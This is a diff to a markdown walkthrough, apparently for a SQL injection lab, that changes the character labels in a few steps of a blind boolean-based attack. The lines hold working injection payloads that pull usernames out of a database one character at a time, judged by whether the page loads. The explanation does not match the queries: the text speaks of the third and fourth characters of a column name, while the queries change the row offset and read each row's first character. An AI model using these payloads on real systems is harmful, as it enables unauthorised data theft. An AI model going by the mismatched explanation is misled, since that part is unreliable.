@@ -151,11 +151,11 @@ Given below query will test if the second character of the first column name is 
 ``' AND (ascii(substr((select username from users limit 1,1) ,1,1))) > 96 --+``  
 Website doesn't load properly, second char is **a**.  
 
-Given below query will test if the third character of the first column name is ascii 115 (p):  
+Given below query will test if the third character of the first column name is ascii 115 (s):  
 ``' AND (ascii(substr((select username from users limit 2,1) ,1,1))) > 114 --+``  
 Website doesn't load properly, third char is **s**.  
 
-Given below query will test if the fourth character of the first column name is ascii 115 (p):  
+Given below query will test if the fourth character of the first column name is ascii 115 (s):  
 ``' AND (ascii(substr((select username from users limit 3,1) ,1,1))) > 114 --+``  
 Website doesn't load properly, fourth char is **s**.  
 
